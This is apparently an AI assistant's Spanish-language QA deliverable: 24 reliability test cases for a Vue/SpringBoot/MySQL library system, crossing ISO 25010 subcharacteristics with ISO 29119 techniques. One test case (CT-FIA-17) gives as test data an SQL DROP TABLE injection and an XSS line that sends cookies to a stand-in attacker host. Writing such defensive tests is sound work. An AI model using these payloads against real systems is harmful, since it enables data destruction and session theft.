Estimado profesional de QA, he recibido y analizado en detalle la descripción de su proyecto de **Gestión Bibliotecaria** (con frontend en Vue, backend en SpringBoot y base de datos en MySQL) junto con su requerimiento explícito para evaluar la característica de **Fiabilidad**.

A continuación, ejecuto estrictamente el flujo de trabajo configurado, reconociendo el cumplimiento inmediato de las fases preliminares gracias a los datos provistos en su mensaje inicial.

### **📋 PASO 1 y PASO 2: Verificación de Entradas (Control de Flujo)**

* **Paso 1 (Descripción del Proyecto):** **Satisfecho.** Se ha provisto un contexto técnico robusto: Vue (Front) \+ SpringBoot (Back) \+ MySQL (DB) con módulos críticos de alquileres, amonestaciones, pagos, reseñas e inventario.  
* **Paso 2 (Selección de Característica ISO/IEC 25010):** **Satisfecho.** Ha seleccionado la característica no funcional de **Fiabilidad**.

### **📊 PASO 3: Matriz de Cruce Técnico de Cobertura Total**

Bajo la norma **ISO/IEC 25010**, la característica general de **Fiabilidad** se compone de **4 subcaracterísticas** ($n=4$). Por otro lado, hemos seleccionado un conjunto riguroso de **6 técnicas de diseño de pruebas** formalizadas en la norma **ISO/IEC/IEEE 29119** ($m=6$).

Siguiendo un enfoque combinatorio estricto, cada subcaracterística se cruza contra todas las técnicas, garantizando una cobertura total sin omisiones.

$$\\text{Casos de Prueba Totales} \= n \\text{ (Subcaracterísticas)} \\times m \\text{ (Técnicas)} \= 4 \\times 6 \= 24 \\text{ escenarios exactos.}$$  
A continuación se presenta la matriz de intersección total. De acuerdo con la regla de negocio, las métricas cuantitativas quedan reservadas exclusivamente para el Paso 4\.

| Subcaracterística ISO 25010 (n) \\ Técnica ISO 29119 (m) | Análisis de Valores Límite (AVL) | Partición de Equivalencia (PE) | Transición de Estados (TE) | Pruebas Basadas en Escenarios (PBE) | Pruebas de Sintaxis (PS) | Pruebas Combinatorias (PC) |
| :---- | :---- | :---- | :---- | :---- | :---- | :---- |
| **1\. Madurez** | CT-FIA-01 | CT-FIA-02 | CT-FIA-03 | CT-FIA-04 | CT-FIA-05 | CT-FIA-06 |
| **2\. Disponibilidad** | CT-FIA-07 | CT-FIA-08 | CT-FIA-09 | CT-FIA-10 | CT-FIA-11 | CT-FIA-12 |
| **3\. Tolerancia a Fallos** | CT-FIA-13 | CT-FIA-14 | CT-FIA-15 | CT-FIA-16 | CT-FIA-17 | CT-FIA-18 |
| **4\. Capacidad de Recuperación** | CT-FIA-19 | CT-FIA-20 | CT-FIA-21 | CT-FIA-22 | CT-FIA-23 | CT-FIA-24 |

### **⚙️ PASO 4: Generación de Casos de Prueba con Inyección de Métricas IEEE 1061**

Procedemos a detallar cada uno de los 24 casos de prueba resultantes de la matriz. Cada caso se estructura de forma independiente y meticulosa, incorporando métricas e indicadores cuantitativos basados en el estándar **IEEE 1061** que rigen estrictamente el criterio de aceptación.

#### **🔍 Bloque I: Subcaracterística \- Madurez (Maturity)**

##### **CT-FIA-01: Evaluación de límites de alquiler en fronteras de negocio**

* **Subcaracterística ISO 25010:** Madurez  
* **Técnica ISO 29119:** Análisis de Valores Límite (AVL)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Excepciones No Manejadas \= 0% (Límite estricto de fallos de desbordamiento en backend).  
* **Precondiciones:** El usuario autenticado en Vue tiene actualmente 4 libros alquilados. El límite máximo parametrizado en la base de datos es de 5 libros simultáneos.  
* **Pasos de ejecución:** 1\. Iniciar sesión en el frontend y dirigirse al catálogo. 2\. Intentar alquilar el 5º libro disponible. 3\. Validar confirmación. Intentar inmediatamente alquilar un 6º libro.  
* **Datos de prueba:** IDs de libros válidos en MySQL en estado "Disponible".  
* **Resultado esperado:** El 5º libro se alquila exitosamente. Al intentar el 6º, SpringBoot intercepta la solicitud y devuelve un código controlado HTTP 409 con un mensaje legible. Ninguna excepción de sistema (error 500\) es registrada en los logs de SpringBoot.

##### **CT-FIA-02: Estabilidad funcional del flujo de pagos y amonestaciones**

* **Subcaracterística ISO 25010:** Madurez  
* **Técnica ISO 29119:** Partición de Equivalencia (PE)  
* **Métrica y Valor Umbral IEEE 1061:** Densidad de Defectos Críticos \= 0.0 fallos funcionales tras la inyección de clases equivalentes.  
* **Precondiciones:** El usuario posee una amonestación activa en su cuenta por retraso de devolución de libro.  
* **Pasos de ejecución:** 1\. Acceder al módulo de gestión de pagos. 2\. Ejecutar transacciones ingresando valores pertenecientes a: Clase Válida (Monto exacto adeudado), Clase Inválida Inferior (Monto negativo), y Clase Inválida Superior (Monto alfanumérico).  
* **Datos de prueba:** Clase Válida: $15.50; Clases Inválidas: \-$5.00, abc\_null.  
* **Resultado esperado:** La clase válida se procesa de manera fluida actualizando el estado en MySQL. Las clases inválidas son rechazadas en la capa de validación de SpringBoot (@Min, @Positive), manteniendo la integridad funcional del sistema sin corromper registros de caja.

##### **CT-FIA-03: Ciclo de vida completo del estado del libro en base de datos**

* **Subcaracterística ISO 25010:** Madurez  
* **Técnica ISO 29119:** Transición de Estados (TE)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Fugas de Memoria en JVM \= 0 bytes de incremento neto residual tras 500 transiciones completas.  
* **Precondiciones:** El libro objeto de prueba está registrado inicialmente en MySQL como "Disponible".  
* **Pasos de ejecución:** 1\. Ejecutar mediante script automatizado el flujo de estados del libro en bucle repetitivo: Disponible $\\rightarrow$ Alquilado $\\rightarrow$ Devuelto con retraso (Amonestado) $\\rightarrow$ Pago realizado $\\rightarrow$ Disponible.  
* **Datos de prueba:** ID de usuario e ID de libro fijos, automatizado con 500 iteraciones consecutivas.  
* **Resultado esperado:** Todas las transiciones de estados de negocio concluyen con éxito en MySQL. El garbage collector de SpringBoot libera correctamente los objetos de entidad de JPA, manteniendo el consumo de memoria Heap plano y estable.

##### **CT-FIA-04: Escenario operativo continuo de usuario final (End-to-End)**

* **Subcaracterística ISO 25010:** Madurez  
* **Técnica ISO 29119:** Pruebas Basadas en Escenarios (PBE)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Éxito Operacional del Escenario (EOR) \= 100% bajo un flujo completo de negocio.  
* **Precondiciones:** Base de datos poblada con datos iniciales reales; el sistema se encuentra en condiciones iniciales normales.  
* **Pasos de ejecución:** 1\. Crear un nuevo perfil de usuario en Vue. 2\. Buscar e inventariar un nuevo libro. 3\. Realizar el alquiler, generar intencionalmente una amonestación, procesar su pago y registrar una reseña literaria de 5 estrellas.  
* **Datos de prueba:** Flujo completo de datos de un usuario tipificado.  
* **Resultado esperado:** Cada paso interconectado del escenario se ejecuta de principio a fin de forma cohesionada, confirmando que la lógica interna del software es madura y no presenta fallas de integración de módulos.

##### **CT-FIA-05: Robustez ante payloads REST malformados en reseñas**

* **Subcaracterística ISO 25010:** Madurez  
* **Técnica ISO 29119:** Pruebas de Sintaxis (PS)  
* **Métrica y Valor Umbral IEEE 1061:** Índice de Filtrado Sintáctico Exitoso \= 100% de solicitudes corruptas rechazadas sin caída del hilo.  
* **Precondiciones:** Endpoint REST /api/libros/reseñas expuesto para recibir datos.  
* **Pasos de ejecución:** 1\. Utilizando Postman, enviar peticiones HTTP POST con estructuras JSON rotas o malformadas al endpoint de reseñas de libros.  
* **Datos de prueba:** Payloads con llaves sin cerrar, comillas ausentes, o anidaciones infinitas de caracteres ilegibles.  
* **Resultado esperado:** El analizador sintáctico Jackson en SpringBoot intercepta de raíz los errores de formato y responde con HTTP 400 (Bad Request). El hilo de procesamiento de Tomcat se libera inmediatamente sin colgar la aplicación.

##### **CT-FIA-06: Interacción cruzada de variables de alquiler e inventario**

* **Subcaracterística ISO 25010:** Madurez  
* **Técnica ISO 29119:** Pruebas Combinatorias (PC)  
* **Métrica y Valor Umbral IEEE 1061:** Coeficiente de Fallas Combinatorias por interacción \= 0%.  
* **Precondiciones:** Múltiples tipos de usuarios y estados de libros configurados en la base de datos.  
* **Pasos de ejecución:** 1\. Ejecutar una batería de pruebas cruzando de forma ortogonal (Pairwise): Tipo de Usuario (Estudiante, Profesor, Externo) $\\times$ Estado físico del libro (Nuevo, Desgastado, Dañado) $\\times$ Método de pago usado para fianzas (Efectivo, Tarjeta, Stripe).  
* **Datos de prueba:** Matriz de combinaciones reducida mediante algoritmo ortogonal.  
* **Resultado esperado:** El sistema procesa y aplica de manera exacta las reglas de negocio específicas para cada combinación, demostrando madurez ante interacciones complejas de datos.

#### **🌐 Bloque II: Subcaracterística \- Disponibilidad (Availability)**

##### **CT-FIA-07: Saturación controlada del pool de conexiones a la base de datos**

* **Subcaracterística ISO 25010:** Disponibilidad  
* **Técnica ISO 29119:** Análisis de Valores Límite (AVL)  
* **Métrica y Valor Umbral IEEE 1061:** Disponibilidad del Pool de Conexiones HikariCP $\\ge 99.9\\%$.  
* **Precondiciones:** El pool de conexiones de SpringBoot hacia MySQL está limitado explícitamente a 50 conexiones máximas activas en application.properties.  
* **Pasos de ejecución:** 1\. Utilizando Apache JMeter, inyectar transacciones de consulta de inventario masivas concurrentes en los puntos críticos de frontera: 49 hilos, 50 hilos y 51 hilos simultáneos.  
* **Datos de prueba:** Solicitudes de HTTP GET distribuidas en ráfagas exactas de hilos.  
* **Resultado esperado:** Con 49 y 50 hilos el sistema responde de inmediato. Al llegar a 51 hilos, la solicitud sobrante entra en cola de espera regulada de manera exitosa y arroja un timeout limpio si se agota el tiempo, salvaguardando la disponibilidad permanente de las primeras 50 conexiones.

##### **CT-FIA-08: Continuidad del servicio web ante picos masivos de consultas**

* **Subcaracterística ISO 25010:** Disponibilidad  
* **Técnica ISO 29119:** Partición de Equivalencia (PE)  
* **Métrica y Valor Umbral IEEE 1061:** Porcentaje de Uptime Operacional de la API $\\ge 99.95\\%$ durante picos de demanda.  
* **Precondiciones:** El entorno se encuentra balanceado y monitorizado en tiempo real.  
* **Pasos de ejecución:** 1\. Simular tráfico categorizado en dos particiones equivalentes: Carga Nominal Normal (50 peticiones/minuto) y Carga Crítica de Inicio de Semestre (5000 peticiones/minuto enfocadas en el inventario y alquiler de libros).  
* **Datos de prueba:** Inyección de tráfico mediante herramientas de pruebas de rendimiento.  
* **Resultado esperado:** En ambas particiones, el servidor responde adecuadamente. El tiempo de respuesta de SpringBoot puede incrementarse controladamente, pero el uptime total de la plataforma se mantiene $\\ge 99.95\\%$.

##### **CT-FIA-09: Disponibilidad percibida en el Frontend durante mantenimientos del Backend**

* **Subcaracterística ISO 25010:** Disponibilidad  
* **Técnica ISO 29119:** Transición de Estados (TE)  
* **Métrica y Valor Umbral IEEE 1061:** Índice de Disponibilidad de Interfaz Percibida \= 100% de redirecciones exitosas.  
* **Precondiciones:** Servidor Vue en ejecución en el cliente; acceso a bajar el contenedor de SpringBoot.  
* **Pasos de ejecución:** 1\. Forzar los estados del backend: Backend Activo $\\rightarrow$ Backend Apagado por Mantenimiento $\\rightarrow$ Backend Reiniciado. 2\. Evaluar el comportamiento de la interfaz de Vue en cada estado.  
* **Datos de prueba:** Interrupción planificada del servicio de SpringBoot.  
* **Resultado esperado:** Cuando el backend transiciona a "Apagado", el frontend en Vue intercepta limpiamente el error de red e inmediatamente cambia su estado para mostrar una pantalla elegante de mantenimiento, evitando que la aplicación web se congele o quede en blanco.

##### **CT-FIA-10: Escenario de alta demanda concurrente sobre un único libro popular**

* **Subcaracterística ISO 25010:** Disponibilidad  
* **Técnica ISO 29119:** Pruebas Basadas en Escenarios (PBE)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Respuestas Exitosas HTTP (No-5xx) $\\ge 99.9\\%$ bajo contención de recursos.  
* **Precondiciones:** Base de datos MySQL cuenta con un único ejemplar físico disponible de un libro de alta demanda.  
* **Pasos de ejecución:** 1\. Simular un escenario de negocio donde 200 usuarios concurrentes intentan entrar a la vez a la pantalla de reseñas y oprimir el botón "Alquilar Libro" en una ventana de 5 segundos.  
* **Datos de prueba:** Script concurrente de simulación de usuarios sobre el ID de un libro específico.  
* **Resultado esperado:** El sistema asigna el libro al primer usuario que completó la petición. A los 199 restantes, el backend les devuelve una respuesta ordenada indicando "Sin stock disponible", manteniendo el sistema 100% disponible y libre de bloqueos mutuos (deadlocks) en la base de datos.

##### **CT-FIA-11: Resistencia de la disponibilidad de la API ante ataques de denegación sintáctica**

* **Subcaracterística ISO 25010:** Disponibilidad  
* **Técnica ISO 29119:** Pruebas de Sintaxis (PS)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Disponibilidad del Canal Legítimo \= 100% (Aislamiento absoluto del tráfico basura).  
* **Precondiciones:** Herramientas de monitorización de hilos de Tomcat encendidas.  
* **Pasos de ejecución:** 1\. Enviar una ráfaga masiva de peticiones REST de creación de usuarios con cabeceras HTTP corruptas, campos ausentes y caracteres de control prohibidos para intentar saturar el procesamiento del backend. 2\. En paralelo, un usuario legítimo realiza un alquiler normal desde Vue.  
* **Datos de prueba:** Flujo masivo de strings corruptos \+ 1 transacción comercial válida de usuario real.  
* **Resultado esperado:** Las peticiones malformadas se descartan en microsegundos en los filtros iniciales de Spring. El hilo principal conserva su disponibilidad intacta, permitiendo que la transacción del usuario legítimo se procese sin demoras.

##### **CT-FIA-12: Disponibilidad del ecosistema ante operaciones cruzadas masivas**

* **Subcaracterística ISO 25010:** Disponibilidad  
* **Técnica ISO 29119:** Pruebas Combinatorias (PC)  
* **Métrica y Valor Umbral IEEE 1061:** Porcentaje de Éxito de Peticiones Concurrentes Mixtas $\\ge 99.9\\%$.  
* **Precondiciones:** El sistema se encuentra bajo una simulación de carga operativa diversificada.  
* **Pasos de ejecución:** 1\. Configurar y lanzar una prueba combinatoria masiva simultánea donde un 40% de los hilos virtuales realizan alquileres, un 30% procesan pagos de amonestaciones, un 20% escriben reseñas de libros y un 10% actualizan el inventario en MySQL.  
* **Datos de prueba:** Perfil transaccional mixto automatizado con JMeter.  
* **Resultado esperado:** SpringBoot y MySQL coordinan de manera eficiente el bloqueo de filas por transacciones separadas. Los recursos de hardware no se agotan, asegurando la total disponibilidad del servicio para todas las operaciones en paralelo.

#### **🛠️ Bloque III: Subcaracterística \- Tolerancia a Fallos (Fault Tolerance)**

##### **CT-FIA-13: Activación del disyuntor (Circuit Breaker) ante límites de respuesta de pasarela de pagos**

* **Subcaracterística ISO 25010:** Tolerancia a Fallos  
* **Técnica ISO 29119:** Análisis de Valores Límite (AVL)  
* **Métrica y Valor Umbral IEEE 1061:** Límite de Tiempo de Tolerancia del Disyuntor $\\le 3000\\text{ ms}$ para corte seguro del hilo.  
* **Precondiciones:** SpringBoot tiene integrado un mecanismo de tolerancia a fallos (ej. Resilience4j) configurado con un timeout estricto de 3 segundos para el API externo de pagos.  
* **Pasos de ejecución:** 1\. Interceptar la llamada a la pasarela externa de pagos e inyectar retardos artificiales exactos de: 2999 ms, 3000 ms y 3001 ms durante la confirmación de pago de una amonestación.  
* **Datos de prueba:** Mock de pasarela externa con delays parametrizables de red.  
* **Resultado esperado:** A los 2999 ms la prueba tolera la demora y procesa el pago. A los 3000 y 3001 ms, el disyuntor salta de inmediato de manera controlada, cancelando la espera y ejecutando un método de contingencia (fallback) que informa al usuario en Vue sin congelar el servidor backend.

##### **CT-FIA-14: Degradación ordenada ante caídas críticas de la infraestructura de red o BD**

* **Subcaracterística ISO 25010:** Tolerancia a Fallos  
* **Técnica ISO 29119:** Partición de Equivalencia (PE)  
* **Métrica y Valor Umbral IEEE 1061:** Eficiencia de Contención de Errores Críticos \= 100% de tolerancia sin colapso global del aplicativo.  
* **Precondiciones:** Entorno de contenedores Docker levantado para los componentes de la aplicación.  
* **Pasos de ejecución:** 1\. Definir dos particiones de fallas: Caída total de MySQL (Partición de Datos offline) y Pérdida de Conectividad con el API de Reseñas (Partición de Microservicio secundario offline). 2\. Desconectar los componentes a la mitad de operaciones de usuario en Vue.  
* **Datos de prueba:** Comandos de infraestructura (docker stop mysql).  
* **Resultado esperado:** El sistema tolera ambos escenarios catastróficos. Al caer MySQL, Vue muestra un aviso controlado solicitando reintentar más tarde. Al caer el servicio de reseñas, el resto de la aplicación (alquileres e inventario) continúa operando con normalidad, demostrando un desacoplamiento tolerante a fallos.

##### **CT-FIA-15: Gestión de reintentos dinámicos en la persistencia de inventario**

* **Subcaracterística ISO 25010:** Tolerancia a Fallos  
* **Técnica ISO 29119:** Transición de Estados (TE)  
* **Métrica y Valor Umbral IEEE 1061:** Coherencia de Estado de Contingencia \= 100% de transiciones correctas según la política de reintentos.  
* **Precondiciones:** La anotación @Retryable de Spring está configurada para reintentar transacciones de escritura hasta 3 veces ante bloqueos temporales de MySQL.  
* **Pasos de ejecución:** 1\. Forzar un bloqueo temporal de escritura en la tabla de inventario de libros en MySQL. 2\. Intentar actualizar el stock desde Vue y evaluar la transición de estados internos del backend.  
* **Datos de prueba:** Estados transicionales: Operación Normal $\\rightarrow$ Error de Bloqueo $\\rightarrow$ Reintento 1, 2, 3 $\\rightarrow$ Éxito (o Fallo definitivo manejado).  
* **Resultado esperado:** SpringBoot realiza los reintentos transparentemente en background de acuerdo al diagrama de estados definido. Si el bloqueo cede, la transacción se procesa con éxito; si persiste, se transiciona a un estado de excepción controlada sin corromper el pool.

##### **CT-FIA-16: Pérdida abrupta de conectividad en el cliente a mitad de un alquiler atómico**

* **Subcaracterística ISO 25010:** Tolerancia a Fallos  
* **Técnica ISO 29119:** Pruebas Basadas en Escenarios (PBE)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Transacciones Huérfanas o Corruptas en MySQL \= 0%.  
* **Precondiciones:** El usuario se encuentra en la interfaz de Vue a punto de confirmar el alquiler de un libro.  
* **Pasos de ejecución:** 1\. El usuario presiona el botón "Confirmar Alquiler". 2\. En el mismo milisegundo en que la petición viaja por la red, desconectar abruptamente el internet del cliente (simulando pérdida de datos móviles).  
* **Datos de prueba:** Desconexión forzada de la tarjeta de red en las DevTools del navegador.  
* **Resultado esperado:** La transacción en SpringBoot está protegida mediante @Transactional. Al interrumpirse la comunicación cliente-servidor antes del handshake completo, el backend ejecuta un Rollback automático en MySQL, asegurando que el stock de libros y el estado del usuario queden limpios e inalterados.

##### **CT-FIA-17: Neutralización de ataques de inyección de código en campos de reseñas**

* **Subcaracterística ISO 25010:** Tolerancia a Fallos  
* **Técnica ISO 29119:** Pruebas de Sintaxis (PS)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Ejecución de Sintaxis Maliciosa \= 0% (Inocuidad absoluta del ataque).  
* **Precondiciones:** Formulario de redacción de reseñas literarias abierto en Vue.  
* **Pasos de ejecución:** 1\. Escribir sentencias con sintaxis de inyección de código SQL y Cross-Site Scripting (XSS) directamente en la caja de texto de reseñas y enviar el formulario.  
* **Datos de prueba:** '; DROP TABLE usuarios; \-- o \<script\>fetch('http://evilhacker.com?cookie=' \+ document.cookie)\</script\>.  
* **Resultado esperado:** El sistema tolera el ataque sintáctico de manera impecable. JPA/Hibernate parametriza el input anulando la inyección SQL, y los filtros del frontend/backend sanitizan los tags HTML de XSS. El texto se almacena de forma plana e inocua, protegiendo la base de datos y a otros usuarios.

##### **CT-FIA-18: Resiliencia ante fallos compuestos simultáneos en cascada**

* **Subcaracterística ISO 25010:** Tolerancia a Fallos  
* **Técnica ISO 29119:** Pruebas Combinatorias (PC)  
* **Métrica y Valor Umbral IEEE 1061:** Porcentaje de Supervivencia del Servidor ante fallos compuestos \= 100% (Sin cuelgues del proceso de SpringBoot).  
* **Precondiciones:** Entorno de pruebas configurado para inyección de fallos combinados.  
* **Pasos de ejecución:** 1\. Simular simultáneamente dos fallos críticos en el ecosistema: Introducir un payload sintácticamente roto en el módulo de amonestaciones y, al mismo tiempo, provocar una desconexión de red de microsegundos en la conexión interna de SpringBoot hacia MySQL.  
* **Datos de prueba:** Inyección combinada automatizada de fallas de software e infraestructura.  
* **Resultado esperado:** La arquitectura responde tolerantemente. El Exception Handler global (@ControllerAdvice) captura la falla sintáctica y la recuperabilidad del Driver de MySQL maneja la desconexión del socket por separado. Ambas excepciones se resuelven en paralelo sin que se genere un desbordamiento o bloqueo del servidor web.

#### **🔄 Bloque IV: Subcaracterística \- Capacidad de Recuperación (Recoverability)**

##### **CT-FIA-19: Tiempo de auto-recuperación del pool de base de datos tras un apagón del motor**

* **Subcaracterística ISO 25010:** Capacidad de Recuperación  
* **Técnica ISO 29119:** Análisis de Valores Límite (AVL)  
* **Métrica y Valor Umbral IEEE 1061:** Tiempo Medio de Recuperación de Conexión (MTTR Limit) $\\le 5.0\\text{ segundos}$ tras el restablecimiento del servicio de datos.  
* **Precondiciones:** El sistema se encuentra operando bajo tráfico normal de usuarios en Vue.  
* **Pasos de ejecución:** 1\. Apagar repentinamente el servicio de MySQL por un lapso de 30 segundos, provocando alertas de conexión en SpringBoot. 2\. Volver a encender el servicio de MySQL. 3\. Medir con precisión el tiempo que demora el pool HikariCP en reconectarse automáticamente y procesar el siguiente alquiler de libro con éxito.  
* **Datos de prueba:** Monitoreo cronometrado en los logs de auditoría del backend.  
* **Resultado esperado:** En el instante en que MySQL vuelve a estar en línea, el mecanismo de auto-recuperación del backend restablece los sockets de forma transparente en un tiempo menor o igual al umbral crítico de 5.0 segundos, reanudando la atención de los usuarios sin necesidad de reiniciar SpringBoot.

##### **CT-FIA-20: Integridad de datos en escenarios equivalentes de recuperación automática vs manual**

* **Subcaracterística ISO 25010:** Capacidad de Recuperación  
* **Técnica ISO 29119:** Partición de Equivalencia (PE)  
* **Métrica y Valor Umbral IEEE 1061:** Índice de Consistencia y Recuperación de Datos \= 100% (Cero discrepancias entre registros originales y recuperados).  
* **Precondiciones:** El sistema almacena respaldos incrementales automáticos de transacciones financieros/pagos de biblioteca.  
* **Pasos de ejecución:** 1\. Evaluar dos clases equivalentes de recuperación tras desastre: Partición A (Recuperación automática de consistencia mediante Rollback lógico de transacciones interrumpidas en SpringBoot) y Partición B (Recuperación manual a través de restauración física de un Dump de MySQL debido a corrupción severa de datos).  
* **Datos de prueba:** Scripts de simulación de fallas lógicas \+ Archivo de Backup físico .sql de producción.  
* **Resultado esperado:** En ambas particiones de recuperación equivalentemente evaluadas, los datos finales de inventario de libros y saldos de amonestaciones de usuarios cuadran perfectamente, garantizando que el sistema vuelve a un estado consistente conocido bajo cualquier modalidad de desastre.

##### **CT-FIA-21: Preservación y restauración automática del estado de sesión en Vue ante caídas de pestañas**

* **Subcaracterística ISO 25010:** Capacidad de Recuperación  
* **Técnica ISO 29119:** Transición de Estados (TE)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Recuperación del Estado del Frontend $\\ge 99.9\\%$ de fidelidad.  
* **Precondiciones:** El bibliotecario está a mitad de un registro complejo de inventario de nuevos libros adquiridos.  
* **Pasos de ejecución:** 1\. Simular una caída abrupta del navegador web o forzar el cierre repentino de la pestaña (Estado: Formulario Activo $\\rightarrow$ Cierre Forzado $\\rightarrow$ Restauración de Pestaña).  
* **Datos de prueba:** Token JWT de sesión y JSON temporal de inventario guardados localmente.  
* **Resultado esperado:** Al reabrir la aplicación web en Vue, el sistema recupera automáticamente el token JWT de LocalStorage/SessionStorage y restaura los datos del formulario que estaban en memoria, reestableciendo el estado del flujo de trabajo exactamente donde se interrumpió.

##### **CT-FIA-22: Apagón eléctrico del servidor durante una actualización masiva de inventario**

* **Subcaracterística ISO 25010:** Capacidad de Recuperación  
* **Técnica ISO 29119:** Pruebas Basadas en Escenarios (PBE)  
* **Métrica y Valor Umbral IEEE 1061:** Integridad Estructural Post-Desastre \= 100% (Cero corrupción de tablas en MySQL).  
* **Precondiciones:** Se da inicio a un proceso masivo de actualización nocturna de stock que involucra 10,000 registros de libros.  
* **Pasos de ejecución:** 1\. Ejecutar el escenario de actualización masiva. 2\. Exactamente cuando el proceso marque el 50% de avance (registro 5,000), cortar de golpe la energía o detener de forma abrupta el proceso del backend de SpringBoot. 3\. Encender el servidor y validar el estado de la base de datos.  
* **Datos de prueba:** Lote de actualización masiva de inventario en formato JSON/Batch.  
* **Resultado esperado:** Al reiniciar el ecosistema, los mecanismos de journaling del motor InnoDB de MySQL y el gestor transaccional de SpringBoot ejecutan la recuperación automática de la base de datos, aplicando un rollback total al lote interrumpido. La base de datos se recupera de manera limpia, sin dejar datos a medias o índices corruptos.

##### **CT-FIA-23: Validación de resiliencia del endpoint de restauración administrativa frente a respaldos corruptos**

* **Subcaracterística ISO 25010:** Capacidad de Recuperación  
* **Técnica ISO 29119:** Pruebas de Sintaxis (PS)  
* **Métrica y Valor Umbral IEEE 1061:** Tasa de Éxito en Rechazo de Recuperaciones Corruptas \= 100% (Protección absoluta de los datos vigentes).  
* **Precondiciones:** Rol de Administrador autenticado con acceso al módulo de restauración del sistema.  
* **Pasos de ejecución:** 1\. Subir al endpoint administrativo de recuperación un archivo de respaldo SQL alterado intencionalmente, que contenga sentencias truncadas, errores sintácticos graves y definiciones de tablas rotas.  
* **Datos de prueba:** Archivo sistema\_backup\_corrupto.sql editado erróneamente.  
* **Resultado esperado:** El módulo de recuperación analiza sintácticamente el archivo antes de su ejecución, detecta las anomalías de formato, interrumpe el proceso de manera segura emitiendo un reporte de error controlado en Vue y preserva intactos y operativos los datos actuales de la biblioteca.

##### **CT-FIA-24: Recuperación y conmutación por error (Failover) en clúster balanceado de SpringBoot**

* **Subcaracterística ISO 25010:** Capacidad de Recuperación  
* **Técnica ISO 29119:** Pruebas Combinatorias (PC)  
* **Métrica y Valor Umbral IEEE 1061:** Tiempo Máximo de Conmutación de Clúster (Failover Time) $\\le 8.0\\text{ segundos}$ manteniendo sesiones vivas.  
* **Precondiciones:** Sistema configurado en alta disponibilidad con dos instancias replicadas de SpringBoot (Nodo A y Nodo B) detrás de un balanceador de carga, con base de datos MySQL centralizada.  
* **Pasos de ejecución:** 1\. Simular una condición combinada extrema: Lanzar un tráfico denso de procesamiento de alquileres y pagos, y en el punto álgido tirar abajo el proceso del Nodo A de SpringBoot, mientras MySQL experimenta una latencia transitoria.  
* **Datos de prueba:** Caída física de un nodo de procesamiento bajo perfil combinatorio de carga masiva.  
* **Resultado esperado:** El balanceador detecta la caída del Nodo A en milisegundos y desvía el 100% del tráfico al Nodo B. Las peticiones de alquileres y pagos se completan exitosamente en el Nodo B gracias a la replicación de sesiones y la auto-recuperación de conexiones hacia MySQL, logrando una recuperación total del entorno en un tiempo global por debajo de los 8.0 segundos establecidos como umbral.